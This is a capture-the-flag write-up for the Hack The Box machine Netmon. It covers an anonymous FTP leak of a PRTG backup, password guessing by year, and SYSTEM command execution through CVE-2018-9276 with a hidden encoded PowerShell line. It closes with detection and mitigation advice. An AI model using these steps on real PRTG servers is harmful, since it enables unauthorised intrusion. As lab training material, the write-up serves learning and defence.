---
machine: Netmon
os: Windows
difficulty: Easy
platform: Hack The Box
category: Services / Windows
state: Retired
pwned: 2026-11-09
tags: [windows, prtg, ftp, cve-2018-9276, command-injection]
---

# Netmon — Hack The Box

**English** | [🇪🇸 Español](README.md)

## TL;DR

Anonymous FTP holds a **PRTG** configuration backup with the panel password. Once inside PRTG, **CVE-2018-9276** turns an *Execute Program* notification into command execution as `SYSTEM`.

## Recon

```bash
nmap -Pn -p- --min-rate 2000 <TARGET_IP>
nmap -Pn -sCV -p 21,80,135,139,445,5985,8080,47001 <TARGET_IP>
```

| Port | Service |
|---|---|
| 21/tcp | Anonymous FTP |
| 80/tcp | IIS (redirect) |
| 8080/tcp | PRTG Network Monitor |
| 445/tcp | SMB |

## Enumeration

```bash
ftp <TARGET_IP>          # anonymous / anonymous
ls -la
get "PRTG Configuration.old.bak"
```

The backup shows `prtgadmin` with an old password. PRTG tends to keep the pattern and bump the year (`...2018` → `...2019`).

```bash
curl -s -u 'prtgadmin:<password>' http://<TARGET_IP>:8080/api/table.json?content=sensors
```

## Foothold

Panel → **Setup → Account Settings → Notifications → Add new notification**:

- Type: *Execute Program*
- Program: `cmd.exe`
- Parameters: `/c powershell -nop -w hidden -enc <BASE64>`

Save it and trigger it; the command runs as the PRTG service account (`SYSTEM`).

```powershell
whoami
type C:\Users\Public\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

## Typical errors

- **Anonymous FTP closed** → try `anonymous:anonymous` and `ftp:ftp`; sometimes the share is read-only but enough.
- **PRTG login rejected** → the backup password is old; try year and case variants.
- **Notification does not execute** → you must **save** and then trigger it from the list; the parameter field rejects single quotes.
- **`whoami` fails** → PRTG does not run as SYSTEM in that build; check with `tasklist`.

## Detection and mitigation

- **4688** with `cmd.exe`/`powershell.exe` as a child of `PRTG Core Server.exe`.
- PRTG: change default credentials, restrict the panel and patch CVE-2018-9276.
- Never leave configuration backups on accessible FTP; encrypt and rotate them.
- Alert on new *Execute Program* notifications and anonymous FTP downloads.

MITRE: T1078, T1059.001, T1190.
